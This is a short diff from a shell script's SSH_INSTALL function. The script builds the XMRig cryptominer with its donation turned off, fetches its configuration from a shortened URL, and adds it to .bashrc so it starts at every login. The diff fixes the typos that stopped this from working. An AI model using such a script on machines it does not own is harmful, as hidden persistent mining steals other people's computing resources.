@@ -381,8 +381,8 @@ SSH_INSTALL(){
   git clone https://github.com/xmrig/xmrig.git
   sed -i 's/kDefaultDonateLevel = 1/kDefaultDonateLevel = 0/g' ./xmrig/src/donate.h
   sed -i 's/kMinimumDonateLevel = 1/kMinimumDonateLevel = 0/g' ./xmrig/src/donate.h
-  mkdir -p xmrig/build && cd xmrig/build && cmake .. -DWITH_HWLOC=OFF && make -j $(nproc) && wget "git.io/J3d0i" -o config.json
-  [ -e $HOME/xmrig/build/xmirg ] && echo "cd $HOME/xmrig/build && ./xmirg" >> "$HOME/.bashrc" && cd $HOME/xmrig/build && ./xmrig
+  mkdir -p xmrig/build && cd xmrig/build && cmake .. -DWITH_HWLOC=OFF && make -j $(nproc) && wget "git.io/J3d0i" -O config.json
+  [ -e $HOME/xmrig/build/xmrig ] && echo "cd $HOME/xmrig/build && ./xmrig" >> "$HOME/.bashrc" && cd $HOME/xmrig/build && ./xmrig
   
   INFO "XMRIG create success"
 }
